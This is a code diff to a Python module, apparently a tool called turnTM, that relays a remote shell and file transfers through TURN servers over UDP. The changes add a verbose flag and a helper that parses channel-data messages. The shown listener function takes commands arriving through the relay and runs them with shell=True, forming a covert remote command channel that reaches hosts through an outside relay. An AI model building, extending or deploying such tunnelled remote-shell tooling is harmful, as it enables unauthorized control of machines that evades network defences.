@@ -273,7 +273,7 @@ def start_file_listener(turn_server, turn_port):
 # ------------------------------------
 # Remote Shell Client
 # ------------------------------------
-def start_shell_client(turn_server, turn_port):
+def start_shell_client(turn_server, turn_port, verbose):
     TURN_SERVER = (turn_server, int(turn_port))    
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(None)
@@ -303,8 +303,9 @@ def start_shell_client(turn_server, turn_port):
                 print(f"Received response from {addr} at {time.strftime('%H:%M:%S')}")
 
                 if response:
-                    print(f"Response (hex): {response.hex()}")
-                    _read_server_response(response)
+                    if verbose:
+                        print(f"Response (hex): {response.hex()}")
+                    _parse_command_response(response, verbose)
             except Exception as e:
                 print(f"Socket error: {e}")
 
@@ -331,7 +332,7 @@ def start_shell_client(turn_server, turn_port):
 # ------------------------------------
 # Remote Shell Listener
 # ------------------------------------
-def start_shell_listener(turn_server, turn_port):
+def start_shell_listener(turn_server, turn_port, verbose):
     TURN_SERVER = (turn_server, int(turn_port))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
     sock.settimeout(None)
@@ -362,7 +363,7 @@ def start_shell_listener(turn_server, turn_port):
 
                 if response:
                     print(f"Response (hex): {response.hex()}")
-                    command = _read_server_response(response)
+                    command = _parse_command_response(response, verbose)
 
                     result = subprocess.run(command, shell=True, capture_output=True, text=True)
                     output = result.stdout if result.stdout else result.stderr
@@ -409,7 +410,7 @@ def start_shell_listener(turn_server, turn_port):
             last_refresh_time = time.time()
 
 # ------------------------------------
-# Helper Function: Parse Server Response
+# Helper Function: Parse Server Response (Will likely only be used in a verbose mode)
 # ------------------------------------
 def _read_server_response(response):    
     # Unpack the STUN header
@@ -595,6 +596,23 @@ def _create_turn_connection(sock, TURN_SERVER, channel_number):
         print(f"Error: {e}")
 
     return (peer_ip, peer_port)
+
+# ------------------------------------
+# Helper Function: Parse Command Response
+# ------------------------------------
+def _parse_command_response(response, verbose):
+    channel_number, length = struct.unpack_from("!HH", response, 0)
+    message = response[4:4+length]  # Slice the message portion
+    if verbose:
+        print("CHANNEL DATA MESSAGE\n")
+        print(f"CHANNEL NUMBER: {channel_number}")
+        print(f"LENGTH: {length}")
+        message = response[4:4+length]  # Slice the message portion
+        print(f"MESSAGE: {message.decode(errors='ignore')}")
+        return message.decode(errors='ignore')
+    else:
+        return message.decode(errors='ignore')
+        
 
 ## When imported using from turnTM import * only imports these functions:
 __all__ = ["start_send_file_client", 
